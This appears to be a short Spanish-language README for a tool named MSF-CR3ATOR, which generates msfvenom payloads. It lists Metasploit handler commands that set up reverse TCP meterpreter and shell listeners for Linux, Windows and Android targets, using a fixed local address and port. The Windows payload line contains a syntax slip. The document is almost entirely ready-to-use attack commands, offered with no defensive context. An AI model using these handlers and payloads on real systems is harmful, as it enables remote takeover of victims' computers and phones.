# MSF-CR3ATOR
Crear Payload con msfvenom Para Windows Linux Y Android

# Ejecutar 
cd MSF-CR3ATOR ; python3 creator.py

# Comando De Msf Console

-------------------------------------------------
	>>>>>>>> LINUX <<<<<<<<<
-------------------------------------------------
msfconsole

use exploit/multi/handler

set payload linux/x64/meterpreter_reverse_tcp

set lhost 192.168.0.101

set lport 5555

exploit

-------------------------------------------------
	>>>>>>>> WINDOWS <<<<<<<<<
-------------------------------------------------
msfconsole

use exploit/multi/handler

set payload/windows/shell/reverse_tcp

set lhost 192.168.0.101

set lport 5555

exploit


-------------------------------------------------
	>>>>>>>> ANDROID <<<<<<<<<
-------------------------------------------------
msfconsole

use exploit/multi/handler

set payload android/meterpreter/reverse_tcp 

set lhost 192.168.0.101

set lport 5555

exploit

